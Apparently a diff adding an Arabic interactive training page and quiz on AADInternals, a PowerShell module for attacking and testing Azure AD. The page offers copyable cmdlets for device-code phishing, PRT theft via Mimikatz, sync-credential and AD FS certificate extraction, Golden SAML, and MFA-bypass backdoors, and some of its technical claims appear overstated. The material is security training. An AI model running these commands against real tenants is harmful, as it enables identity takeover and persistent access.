@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دليل AADInternals الشامل مع الامتحان التفاعلي</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e6e6e6;
+            line-height: 1.8;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .signature {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 0.7em;
+            font-family: monospace;
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(25, 25, 45, 0.8);
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .header h1 {
+            color: #00ff88;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        .section {
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .section:hover { border-color: #00d4ff; box-shadow: 0 0 15px rgba(0, 212, 255, 0.2); }
+
+        .section h2 {
+            color: #f78166;
+            border-right: 4px solid #f78166;
+            padding-right: 16px;
+            margin: 32px 0 16px 0;
+            cursor: pointer;
+            font-size: 1.5em;
+            transition: all 0.2s ease;
+        }
+
+        .section h2:hover { color: #58a6ff; border-right-color: #58a6ff; }
+
+        .section h3 { color: #7ee787; margin: 24px 0 12px 0; font-size: 1.2em; }
+
+        .section-content { transition: all 0.3s ease; }
+
+        .expand-icon { display: inline-block; margin-right: 8px; transition: transform 0.2s ease; }
+
+        .command-box {
+            background: #0d0d1a;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 12px 0;
+            font-family: monospace;
+            color: #00ff88;
+            direction: ltr;
+            text-align: left;
+            cursor: pointer;
+        }
+
+        .command-box::before { content: "$ "; color: #f78166; }
+
+        .example-box {
+            background: rgba(126, 231, 135, 0.1);
+            border-left: 4px solid #7ee787;
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 6px;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .technical-box {
+            background: rgba(88, 166, 255, 0.1);
+            border-left: 4px solid #58a6ff;
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 6px;
+        }
+
+        .self-question {
+            background: rgba(255, 170, 0, 0.1);
+            border-right: 4px solid #ffaa00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .self-question h4 { color: #ffaa00; margin-bottom: 10px; }
+
+        .tool-image {
+            width: 100%;
+            max-width: 800px;
+            border-radius: 10px;
+            margin: 20px auto;
+            display: block;
+            border: 2px solid #333;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+
+        .image-caption {
+            text-align: center;
+            color: #aaa;
+            font-size: 0.9em;
+            margin-top: 10px;
+            margin-bottom: 20px;
+        }
+
+        .exam-button {
+            background: linear-gradient(45deg, #ff6b00, #ffaa00);
+            color: #0d0d1a;
+            border: none;
+            padding: 20px 40px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.3em;
+            margin: 30px auto;
+            display: block;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.4);
+        }
+
+        .exam-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 107, 0, 0.6);
+        }
+
+        .lesson-card {
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .lesson-title {
+            color: #00d4ff;
+            font-size: 1.8em;
+            margin-bottom: 15px;
+            border-right: 5px solid #00d4ff;
+            padding-right: 15px;
+        }
+
+        .quiz-section {
+            background: rgba(40, 40, 60, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #444;
+        }
+
+        .quiz-question {
+            color: #ffaa00;
+            font-size: 1.3em;
+            margin-bottom: 15px;
+        }
+
+        .quiz-options { display: grid; gap: 10px; margin-bottom: 20px; }
+
+        .quiz-option {
+            background: #2a2a3a;
+            border: 2px solid #555;
+            border-radius: 8px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1.1em;
+        }
+
+        .quiz-option:hover { border-color: #00d4ff; background: rgba(0, 212, 255, 0.1); }
+
+        .quiz-option.correct { border-color: #00ff88; background: rgba(0, 255, 136, 0.2); }
+
+        .quiz-option.incorrect { border-color: #ff0000; background: rgba(255, 0, 0, 0.2); }
+
+        .quiz-option.disabled { cursor: not-allowed; opacity: 0.6; }
+
+        .feedback {
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .feedback.correct {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid #00ff88;
+            color: #00ff88;
+        }
+
+        .feedback.incorrect {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            color: #ff6666;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #0d0d1a;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4); }
+
+        .btn:disabled { background: #555; cursor: not-allowed; }
+
+        .btn-success { background: linear-gradient(45deg, #00ff88, #008800); }
+
+        .difficulty-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 0.8em;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .difficulty-easy { background: #00ff88; color: #000; }
+        .difficulty-medium { background: #ffaa00; color: #000; }
+        .difficulty-hard { background: #ff6b00; color: #fff; }
+        .difficulty-expert { background: #ff0000; color: #fff; }
+
+        .consequences-box {
+            background: rgba(255, 0, 0, 0.15);
+            border-left: 4px solid #ff0000;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 6px;
+        }
+
+        .hidden { display: none !important; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in { animation: fadeIn 0.5s ease; }
+
+        @media (max-width: 768px) {
+            .container { padding: 15px; }
+            .header h1 { font-size: 1.8em; }
+            .lesson-title { font-size: 1.4em; }
+            .nav-buttons { flex-direction: column; gap: 10px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="signature">Kali@~linux</div>
+    <div class="container">
+        <!-- ==== رأس الصفحة ==== -->
+        <div class="header">
+            <h1>دليل AADInternals الشامل مع الامتحان التفاعلي</h1>
+            <p style="color: #00d4ff; font-size: 1.2em;">دليل شامل مع اختبار تفاعلي تدريجي من المبتدئ إلى الخبير</p>
+        </div>
+
+        <!-- ==== تحذير قانوني ==== -->
+        <div class="warning-box">
+            <h3>⚠️ تحذير قانوني وأخلاقي</h3>
+            <p>هذا التطبيق للتعليم فقط. استخدام AADInternals على Azure AD tenants دون إذن صريح يعتبر جريمة. الأداة مدرجة في MITRE ATT&CK.</p>
+        </div>
+
+        <!-- ==== قسم مقدمة AADInternals ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🔍 ما هو AADInternals؟
+            </h2>
+            <div class="section-content hidden">
+                <p><strong>AADInternals</strong> هو PowerShell module متقدم لاختبار أمان Azure Active Directory (Azure AD) و Microsoft 365. طوره <strong>Nestori Syynimaa (@DrAzureAD)</strong> وهو أداة شاملة للـ Red Team و Blue Team.</p>
+                
+                <img src="https://kimi-web-img.moonshot.cn/img/aadinternals.com/70b7d6884b4389a56f148e42f628be8bd08e5e93.png" alt="AADInternals PowerShell" class="tool-image">
+                <div class="image-caption">واجهة PowerShell لتشغيل أوامر AADInternals</div>
+
+                <h3>🎯 ما يميز AADInternals</h3>
+                <ul>
+                    <li>✅ <strong>100+ cmdlet:</strong> تغطي كل جوانب Azure AD</li>
+                    <li>✅ <strong>OSINT:</strong> جمع معلومات كoutsider بدون credentials</li>
+                    <li>✅ <strong>Token Manipulation:</strong> التلاعب بـ access tokens</li>
+                    <li>✅ <strong>Device Compliance:</strong> تزوير حالة الجهاز</li>
+                    <li>✅ <strong>PRT Abuse:</strong> استغلال Primary Refresh Tokens</li>
+                    <li>✅ <strong>Backdoor Creation:</strong> إنشاء backdoors للـ MFA bypass</li>
+                </ul>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا AADInternals مختلف عن أدوات Azure الأخرى؟</h4>
+                    <p><strong>الجواب:</strong> أدوات Azure الرسمية (Az PowerShell, Azure CLI) تتطلب صلاحيات واضحة ويتم تسجيل كل عملية. AADInternals يستخدم internal APIs و undocumented endpoints للوصول لبيانات لا تصلها الأدوات الرسمية. مثلاً: يمكنك جمع معلومات عن tenant كoutsider بدون أي صلاحيات، أو تزوير device compliance بدون MDM.</p>
+                </div>
+
+                <div class="example-box">
+                    <strong>💡 مثال عملي:</strong> Az PowerShell يتطلب Global Admin لرؤية جميع المستخدمين. AADInternals يمكنه استخراج قائمة المستخدمين كـ Guest user عادية عبر ReconAsInsider. الفرق هو استغلال الثغرات في APIs بدلاً من الالتزام بالـ official ways.
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم التثبيت ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🔧 التثبيت والتهيئة
+            </h2>
+            <div class="section-content hidden">
+                <h3>📦 التثبيت من PowerShell Gallery</h3>
+                <div class="command-box" onclick="copyCommand(this)">Install-Module -Name AADInternals -Force</div>
+                <div class="command-box" onclick="copyCommand(this)">Import-Module AADInternals</div>
+
+                <img src="https://kimi-web-img.moonshot.cn/img/4sysops.com/e82697c932d8e8c4a4423273253220011d8c72fd.png" alt="PowerShell Installation" class="tool-image">
+                <div class="image-caption">تثبيت PowerShell module على Windows</div>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا نستخدم -Force؟</h4>
+                    <p><strong>الجواب:</strong> لأن AADInternals ليس موقعاً رقمياً من Microsoft. PowerShell يحذرك أنه "untrusted repository". -Force يتجاوز هذا التحذير. هذا خطر أمني لأنك تقبل code من مصدر غير موثوق، لكنه ضروري للاختبار.</p>
+                </div>
+
+                <h3>🔍 التحقق من التثبيت</h3>
+                <div class="command-box" onclick="copyCommand(this)">Get-Command -Module AADInternals | Measure-Object</div>
+                <p>يجب أن يظهر أكثر من 100 cmdlet.</p>
+
+                <div class="warning-box">
+                    <p>⚠️ <strong>هام:</strong> AADInternals يتطلب PowerShell 5.1 أو PowerShell 7+. بعض الـ cmdlets لا تعمل على Linux PowerShell.
+                </p></div>
+            </div>
+        </div>
+
+        <!-- ==== قسم OSINT كـ Outsider ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🕵️ OSINT كـ Outsider (بدون Credentials)
+            </h2>
+            <div class="section-content hidden">
+                <h3>🎯 جمع معلومات Tenant</h3>
+                <p>أي شخص يمكنه جمع هذه المعلومات بدون تسجيل دخول:</p>
+                
+                <div class="command-box" onclick="copyCommand(this)">Invoke-AADIntReconAsOutsider -DomainName company.com</div>
+
+                <img src="https://kimi-web-img.moonshot.cn/img/s.secrss.com/b1f4c81e1a644061f4ba821f8beb224b0221faaf.png" alt="AADInternals Recon" class="tool-image">
+                <div class="image-caption">مخرجات Invoke-AADIntReconAsOutsider تُظهر معلومات Tenant</div>
+
+                <h3>📊 ما الذي يُكشفه؟</h3>
+                <ul>
+                    <li><strong>Tenant ID:</strong> GUID فريد للـ tenant</li>
+                    <li><strong>Tenant Name:</strong> الاسم الداخلي (مثل company.onmicrosoft.com)</li>
+                    <li><strong>Domains:</strong> كل النطاقات المُسجلة</li>
+                    <li><strong>Domain Type:</strong> Managed أو Federated (مع ADFS)</li>
+                    <li><strong>DesktopSSO:</strong> هل Seamless SSO مُمكّن؟</li>
+                    <li><strong>MX Records:</strong> هل يستخدم Exchange Online؟</li>
+                </ul>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا DesktopSSO مهم للمهاجم؟</h4>
+                    <p><strong>الجواب:</strong> DesktopSSO (Seamless SSO) يعني أن المستخدمين على الشبكة الداخلية يتم تسجيل دخولهم تلقائياً. إذا استطاع المهاجم الوصول لـ AZUREADSSOACC$ account (من Active Directory)، يمكنه تزوير tokens لأي مستخدم بدون معرفة كلمة المرور!</p>
+                </div>
+
+                <h3>👤 User Enumeration</h3>
+                <div class="command-box" onclick="copyCommand(this)">Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@company.com"</div>
+                <p>يتحقق مما إذا كان المستخدم موجوداً عبر GetCredentialType API.</p>
+
+                <div class="technical-box">
+                    <strong>🛠️ التقنية:</strong> API يُرجع "IfExistsResult" - 0 يعني المستخدم موجود، 1 يعني غير موجود. لا يتطلب authentication!
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم Access Tokens ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🔐 Access Tokens والمصادقة
+            </h2>
+            <div class="section-content hidden">
+                <h3>🎫 الحصول على Access Token</h3>
+                <div class="command-box" onclick="copyCommand(this)">Get-AADIntAccessTokenForAADGraph -SaveToCache</div>
+                <div class="command-box" onclick="copyCommand(this)">Get-AADIntAccessTokenForMSGraph -SaveToCache</div>
+
+                <div class="self-question">
+                    <h4>🤔 ما الفرق بين AAD Graph و MS Graph؟</h4>
+                    <p><strong>الجواب:</strong> AAD Graph هو API قديم (deprecated) لكنه لا يزال يعمل ويُعطي وصولاً لبعض البيانات التي MS Graph لا يُعطيها. MS Graph هو الحديث والمُوصى به. AADInternals يدعم الاثنين للـ backward compatibility والوصول للبيانات القديمة.</p>
+                </div>
+
+                <h3>🔄 استخدام Token مع AzureAD Module</h3>
+                <div class="command-box" onclick="copyCommand(this)">Connect-AzureAD -AadAccessToken (Get-AADIntAccessTokenForAADGraph)</div>
+
+                <div class="example-box">
+                    <strong>💡 نصيحة:</strong> استخدم <code>-SaveToCache</code> لتخزين Token في الذاكرة. هذا يمنع إعادة المصادقة في كل cmdlet.
+                </div>
+
+                <h3>🎭 Device Code Phishing</h3>
+                <div class="command-box" onclick="copyCommand(this)">Invoke-AADIntPhishing -Recipients "victim@company.com" -Subject "Urgent: Verify your account"</div>
+
+                <img src="https://kimi-web-img.moonshot.cn/img/i.ytimg.com/90bd78b2da550c94090e5a62c8744ae4c4a4ec55.jpg" alt="Device Code Phishing" class="tool-image">
+                <div class="image-caption">هجوم Device Code Phishing - المستخدم يُدخل الكود في microsoft.com</div>
+
+                <div class="warning-box">
+                    <p>⚠️ <strong>هذا هجوم حقيقي!</strong> المستخدم يتلقى بريداً يطلب منه إدخال كود في microsoft.com. إذا وافق، يحصل المهاجم على access token صالح لـ 15 دقيقة (قابل للتجديد).
+                </p></div>
+            </div>
+        </div>
+
+        <!-- ==== قسم PRT و Device Abuse ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 💻 استغلال الأجهزة و PRT
+            </h2>
+            <div class="section-content hidden">
+                <h3>🔑 Primary Refresh Token (PRT)</h3>
+                <p>PRT هو "مفتاح المملكة" في Azure AD. إذا حصلت عليه، يمكنك انتحال هوية المستخدم:</p>
+                
+                <div class="command-box" onclick="copyCommand(this)">Get-AADIntUserPRTToken</div>
+                <div class="command-box" onclick="copyCommand(this)">Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken</div>
+
+                <div class="self-question">
+                    <h4>🤔 ما هو PRT بالضبط؟</h4>
+                    <p><strong>الجواب:</strong> PRT هو refresh token خاص بـ Windows 10/11. يُخزن في LSASS (Local Security Authority Subsystem Service). يحتوي على مفاتيح تشفير تُستخدم لتوقيع cookies. إذا سرقت PRT + session key، يمكنك إنشاء cookies صالحة لأي موقع Microsoft.</p>
+                </div>
+
+                <h3>🎭 تزوير Device Compliance</h3>
+                <div class="command-box" onclick="copyCommand(this)">Set-AADIntDeviceCompliant -DeviceId "device-guid" -Compliant</div>
+
+                <p>يُغير حالة الجهاز إلى "Compliant" حتى لو لم يكن كذلك. هذا يتجاوز Conditional Access policies التي تتطلب أجهزة compliant.</p>
+
+                <div class="technical-box">
+                    <strong>🛠️ آلية الهجوم:</strong> Azure AD يثق في تقارير MDM (Mobile Device Management). AADInternals يُرسل تقريراً مزيفاً مباشرة إلى Azure AD عبر AAD Graph API، متجاوزاً MDM الحقيقي.
+                </div>
+
+                <h3>🔄 PRT مع Mimikatz</h3>
+                <div class="command-box" onclick="copyCommand(this)"># من Mimikatz: dpapi::cloudapkd /prt:xxx /key:xxx</div>
+                <div class="command-box" onclick="copyCommand(this)">New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce</div>
+
+                <div class="example-box">
+                    <strong>💡 سيناريو الهجوم:</strong> 1) اختراق workstation عادية 2) استخراج PRT بـ Mimikatz 3) نقل PRT إلى جهاز آخر 4) إنشاء tokens والوصول للشبكة كـ user compromised.
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم Azure AD Connect ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🔗 استغلال Azure AD Connect
+            </h2>
+            <div class="section-content hidden">
+                <h3>⚠️ خطورة Azure AD Connect</h3>
+                <p>Azure AD Connect يُزامن بين Active Directory on-premises و Azure AD. امتلاك صلاحيات عليه = امتلاك المملكة:</p>
+                
+                <div class="command-box" onclick="copyCommand(this)">Get-AADIntSyncCredentials</div>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا Get-AADIntSyncCredentials خطير جداً؟</h4>
+                    <p><strong>الجواب:</strong> هذا cmdlet يستخرج بيانات اعتماد Azure AD Connect sync account. هذا account له صلاحيات DCSync تقريباً - يمكنه قراءة أي hash لأي مستخدم في Azure AD. إذا كان AD Connect على DC، المهاجم يستطيع أيضاً استخراج hashes من on-prem AD.</p>
+                </div>
+
+                <h3>🎭 تعديل Synced Users</h3>
+                <div class="command-box" onclick="copyCommand(this)">$creds = Get-Credential</div>
+                <div class="command-box" onclick="copyCommand(this)">Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache</div>
+                <div class="command-box" onclick="copyCommand(this)">Set-AADIntUser -UserPrincipalName "admin@company.com" -ImmutableId "HACKED"</div>
+
+                <div class="warning-box">
+                    <p>⚠️ <strong>هذا يكسر المزامنة!</strong> تغيير ImmutableId يمنع المستخدم من المزامنة مع on-prem AD. استخدم فقط في بيئات test.
+                </p></div>
+
+                <h3>🔑 Pass-through Authentication</h3>
+                <div class="command-box" onclick="copyCommand(this)">Get-AADIntPTASecrets</div>
+                <p>يستخرج مفاتيح تشفير لـ Pass-through Authentication agents. يمكن استخدامها لاعتراض المصادقات.</p>
+            </div>
+        </div>
+
+        <!-- ==== قسم AD FS ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🏛️ استغلال AD FS
+            </h2>
+            <div class="section-content hidden">
+                <h3>🎫 تصدير شهادات AD FS</h3>
+                <p>AD FS (Active Directory Federation Services) هو "المفتاح الذهبي" للـ SSO:</p>
+                
+                <div class="command-box" onclick="copyCommand(this)">Export-AADIntADFSCertificates</div>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا شهادات AD FS مهمة؟</h4>
+                    <p><strong>الجواب:</strong> AD FS يُستخدم لتوقيع SAML tokens. إذا سرقت شهادة التوقيع (Token Signing Certificate)، يمكنك إنشاء SAML tokens صالحة لأي مستخدم في أي تطبيق يستخدم AD FS للـ SSO. هذا يُسمى Golden SAML attack.</p>
+                </div>
+
+                <h3>🎭 إنشاء SAML Token مزيف</h3>
+                <div class="command-box" onclick="copyCommand(this)">New-AADIntSAMLToken -UserPrincipalName "admin@company.com" -ImmutableId "xxx"</div>
+
+                <div class="technical-box">
+                    <strong>🛠️ Golden SAML:</strong> مثل Golden Ticket في Kerberos لكن للسحابة. يعمل حتى لو تم تغيير كلمة مرور المستخدم أو تعطيل حسابه!
+                </div>
+
+                <h3>🔍 اكتشاف AD FS</h3>
+                <div class="command-box" onclick="copyCommand(this)">Get-AADIntLoginInformation -UserName "user@company.com"</div>
+                <p>يُظهر إذا كان النطاق يستخدم Federated authentication (AD FS) أو Managed.</p>
+            </div>
+        </div>
+
+        <!-- ==== قسم Backdoors و Persistence ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🚪 Backdoors وآليات الاستمرارية
+            </h2>
+            <div class="section-content hidden">
+                <h3>🎯 إنشاء Backdoor للـ MFA Bypass</h3>
+                <div class="command-box" onclick="copyCommand(this)">ConvertTo-AADIntBackdoor -DomainName "backdoor.company.myo365.site"</div>
+
+                <div class="self-question">
+                    <h4>🤔 كيف يعمل Backdoor في Azure AD؟</h4>
+                    <p><strong>الجواب:</strong> يُنشئ IssuerUri مخصص (مثل http://any.sts/xxx). عندما يُرسل SAML token من هذا Issuer، Azure AD يقبله كـ valid. المهاجم يُنشئ SAML token موقع بمفتاحه الخاص، وAzure AD يثق به. هذا يتجاوز MFA لأن "IdP" المهاجم لا يُطبق MFA.</p>
+                </div>
+
+                <h3>🎭 استخدام Backdoor</h3>
+                <div class="command-box" onclick="copyCommand(this)">Open-AADIntOffice365Portal -Issuer "http://any.sts/xxx" -UserName "admin@company.com"</div>
+
+                <div class="warning-box">
+                    <p>⚠️ <strong>هذا backdoor حقيقي!</strong> يُستخدم في هجمات NOBELIUM (SolarWinds). Microsoft لا تستطيع اكتشافه بسهولة لأنه يبدو كـ IdP شرعي.
+                </p></div>
+
+                <h3>🔄 إضافة Device مزيف</h3>
+                <div class="command-box" onclick="copyCommand(this)">Join-AADIntDeviceToAzureAD -DeviceName "HACKED-PC" -DeviceType "Windows"</div>
+                <p>يُسجل جهازاً مزيفاً في Azure AD. يمكن استخدامه لـ Conditional Access bypass.</p>
+            </div>
+        </div>
+
+        <!-- ==== زر الامتحان ==== -->
+        <div class="section fade-in" style="text-align: center; padding: 40px;">
+            <button class="exam-button" onclick="startExam()">🎮 بدء الامتحان التفاعلي (20 سؤال)</button>
+            <p style="margin-top: 15px; color: #aaa;">5 أسئلة سهلة (3 خيارات) • 9 أسئلة صعبة (5 خيارات) • 6 أسئلة خبير (6 خيارات)</p>
+            <p style="color: #ffaa00; font-size: 0.9em;">⚠️ الإجابات موزعة عشوائياً في كل مرة!</p>
+        </div>
+
+        <!-- ==== حاوية الامتحان ==== -->
+        <div id="examContainer" class="hidden"></div>
+
+    </div>
+
+    <script>
+        // ==== دوال الدليل التوضيحي ====
+        function toggleSection(element) {
+            const content = element.nextElementSibling;
+            const icon = element.querySelector('.expand-icon');
+            
+            if (content.classList.contains('hidden')) {
+                content.classList.remove('hidden');
+                icon.innerHTML = '▼';
+            } else {
+                content.classList.add('hidden');
+                icon.innerHTML = '▶';
+            }
+        }
+
+        function copyCommand(element) {
+            const text = element.textContent.trim().replace('$ ', '');
+            navigator.clipboard.writeText(text).then(() => {
+                element.style.background = '#00ff88';
+                element.style.color = '#0d0d1a';
+                setTimeout(() => {
+                    element.style.background = '#0d0d1a';
+                    element.style.color = '#00ff88';
+                }, 500);
+            });
+        }
+
+        // ==== بيانات الامتحان (20 سؤال) ====
+        let currentLesson = 1;
+        let score = 0;
+        let mistakes = [];
+        let examStarted = false;
+
+        const examQuestions = [
+            // --- 5 أسئلة سهلة (3 خيارات) ---
+            {
+                difficulty: "easy",
+                question: "ما هو AADInternals؟",
+                options: [
+                    { text: "PowerShell module لاختبار أمان Azure AD", correct: true },
+                    { text: "أداة فحص ثغرات الشبكات", correct: false },
+                    { text: "برنامج لمكافحة الفيروسات", correct: false }
+                ],
+                correctExplanation: "AADInternals هو PowerShell module متخصص في Azure AD و Microsoft 365 security testing.",
+                wrongExplanation: "AADInternals ليس لفحص الشبكات (هذا Nessus) ولا لمكافحة الفيروسات. هو للـ penetration testing.",
+                consequences: "إذا لم تفهم الغرض، ستستخدمه بشكل خاطئ."
+            },
+            {
+                difficulty: "easy",
+                question: "ما هو الـ cmdlet لجمع معلومات Tenant كـ outsider؟",
+                options: [
+                    { text: "Invoke-AADIntReconAsOutsider", correct: true },
+                    { text: "Get-AADIntUsers", correct: false },
+                    { text: "Connect-AzureAD", correct: false }
+                ],
+                correctExplanation: "Invoke-AADIntReconAsOutsider يجمع معلومات بدون credentials.",
+                wrongExplanation: "Get-AADIntUsers يتطلب token. Connect-AzureAD للاتصال الرسمي.",
+                consequences: "استخدام الأمر الخاطئ يتطلب صلاحيات قد لا تملكها."
+            },
+            {
+                difficulty: "easy",
+                question: "ما هو PRT في Azure AD؟",
+                options: [
+                    { text: "Primary Refresh Token للمصادقة المستمرة", correct: true },
+                    { text: "Public Resource Table", correct: false },
+                    { text: "Private Routing Table", correct: false }
+                ],
+                correctExplanation: "PRT هو Primary Refresh Token يُخزن في Windows ويُستخدم للـ SSO.",
+                wrongExplanation: "PRT ليس Public Resource Table أو Private Routing Table. هو token خاص بالهوية.",
+                consequences: "عدم فهم PRT يمنعك من استغلاله في الهجمات."
+            },
+            {
+                difficulty: "easy",
+                question: "أي cmdlet يستخرج بيانات Azure AD Connect؟",
+                options: [
+                    { text: "Get-AADIntSyncCredentials", correct: true },
+                    { text: "Get-AADIntAccessToken", correct: false },
+                    { text: "Export-AADIntADFSCertificates", correct: false }
+                ],
+                correctExplanation: "Get-AADIntSyncCredentials يستخرج credentials للـ sync account.",
+                wrongExplanation: "Get-AADIntAccessToken للـ tokens. Export-AADIntADFSCertificates للـ AD FS.",
+                consequences: "استخدام الأمر الخاطئ لن يعطيك البيانات الحساسة."
+            },
+            {
+                difficulty: "easy",
+                question: "ما هو Golden SAML attack؟",
+                options: [
+                    { text: "إنشاء SAML tokens مزيفة بشهادات مسروقة", correct: true },
+                    { text: "سرقة كلمات المرور من قاعدة بيانات", correct: false },
+                    { text: "حقن SQL في Azure AD", correct: false }
+                ],
+                correctExplanation: "Golden SAML يستخدم شهادات AD FS المسروقة لإنشاء tokens صالحة.",
+                wrongExplanation: "ليس سرقة passwords أو SQL injection. هو هجوم على SAML federation.",
+                consequences: "عدم الفهم يمنعك من تنفيذ أو الدفاع ضد الهجوم."
+            },
+
+            // --- 9 أسئلة صعبة (5 خيارات) ---
+            {
+                difficulty: "hard",
+                question: "لماذا Device Code Phishing فعال ضد MFA؟",
+                options: [
+                    { text: "المستخدم يُدخل الكود في microsoft.com الشرعي", correct: true },
+                    { text: "يتجاوز MFA باختراق Microsoft", correct: false },
+                    { text: "يستخدم ثغرة في Azure AD", correct: false },
+                    { text: "يُسرق كلمة المرور فقط", correct: false },
+                    { text: "يعمل فقط مع تطبيقات الجوال", correct: false }
+                ],
+                correctExplanation: "المستخدم يرى microsoft.com الشرعي ويثق به. الكود يُعطي access token صالح.",
+                wrongExplanation: "لا يخترق Microsoft. لا يستخدم ثغرة. لا يُسرق password فقط. لا يقتصر على الجوال.",
+                consequences: "إذا لم تفهم، ستفشل في تنفيذ الهجوم أو توعية المستخدمين."
+            },
+            {
+                difficulty: "hard",
+                question: "ما الفرق بين AAD Graph و MS Graph tokens؟",
+                options: [
+                    { text: "AAD Graph قديم لكنه يعطي وصولاً لبيانات إضافية", correct: true },
+                    { text: "AAD Graph أسرع دائماً", correct: false },
+                    { text: "MS Graph لا يعمل مع AADInternals", correct: false },
+                    { text: "AAD Graph أكثر أماناً", correct: false },
+                    { text: "لا فرق بينهما", correct: false }
+                ],
+                correctExplanation: "AAD Graph deprecated لكنه يحتوي على endpoints لا تزال تعطي بيانات حساسة.",
+                wrongExplanation: "AAD Graph ليس أسرع. MS Graph يعمل. AAD Graph ليس أكثر أماناً. هناك فرق.",
+                consequences: "استخدام MS Graph فقط قد يفوتك بعض البيانات التي AAD Graph يستطيع الوصول لها."
+            },
+            {
+                difficulty: "hard",
+                question: "كيف يعمل Set-AADIntDeviceCompliant؟",
+                options: [
+                    { text: "يُرسل تقريراً مزيفاً إلى Azure AD مباشرة", correct: true },
+                    { text: "يخترق MDM server", correct: false },
+                    { text: "يُعدل registry على الجهاز", correct: false },
+                    { text: "يستخدم Group Policy", correct: false },
+                    { text: "يتطلب Global Admin", correct: false }
+                ],
+                correctExplanation: "يُرسل API call مباشرة إلى Azure AD يُعلن الجهاز compliant. لا يتطلب MDM حقيقي.",
+                wrongExplanation: "لا يخترق MDM. لا يُعدل registry محلياً. لا يستخدم GPO. لا يتطلب Global Admin.",
+                consequences: "فهم الخطأ يجعلك تبحث عن defenses في المكان الخطأ."
+            },
+            {
+                difficulty: "hard",
